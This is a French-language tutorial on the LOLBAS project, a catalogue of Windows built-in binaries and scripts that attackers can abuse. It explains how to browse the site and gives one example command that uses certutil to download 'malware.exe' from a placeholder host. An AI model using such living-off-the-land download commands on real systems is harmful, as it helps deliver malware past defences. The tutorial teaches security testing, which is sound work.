# LOLBAS

#### **Tuto LOLBAS**

**Introduction**

LOLBAS (Living Off The Land Binaries and Scripts) est un référentiel en ligne qui recense les binaires, scripts, et bibliothèques Windows pouvant être détournés à des fins malveillantes ou pour des tests de sécurité.

**Accéder à LOLBAS**

* URL : [LOLBAS](https://lolbas-project.github.io)

**Fonctionnalités principales :**

* **Catalogue des binaires Windows abusables :** Une collection exhaustive de binaires et scripts légitimes intégrés à Windows qui peuvent être détournés.
* **Filtres par type :** Explorer les binaires, scripts, ou bibliothèques par catégories spécifiques.
* **Exemples détaillés :** Chaque binaire est accompagné de techniques exploitables pour des activités comme l'escalade de privilèges, l'exfiltration, ou la persistance.

**Comment utiliser LOLBAS**

1. **Rechercher un binaire/script :**
   * Accédez à [LOLBAS](https://lolbas-project.github.io).
   * Utilisez la barre de recherche ou parcourez les catégories pour trouver un binaire spécifique (ex. : `certutil`).
2. **Explorer les capacités :**
   * Cliquez sur le binaire pour voir les scénarios exploitables :
     * **Execution** : Utilisation du binaire pour exécuter des commandes arbitraires.
     * **Download** : Exploitation pour télécharger des fichiers à partir de l'Internet.
     * **Persistence** : Techniques pour maintenir l'accès au système.
3. **Exemple avec `certutil` :**
   *   Utilisation de `certutil` pour télécharger un fichier :

       ```cmd
       certutil.exe -urlcache -split -f http://example.com/malware.exe malware.exe
       ```
4. **Tester dans un environnement sécurisé :**
   * Ces techniques doivent être expérimentées dans un environnement contrôlé pour éviter tout impact négatif.

***

#### **Bonnes Pratiques pour les Deux Ressources :**

* **Utilisation Éthique :** Ces outils sont conçus pour l'apprentissage et les tests de sécurité éthiques uniquement.
* **Test en Environnement Sécurisé :** Utilisez des machines virtuelles ou des environnements isolés pour tester les scénarios.
* **Mises à Jour Régulières :** Consultez fréquemment ces référentiels, car de nouveaux outils et méthodes y sont régulièrement ajoutés.
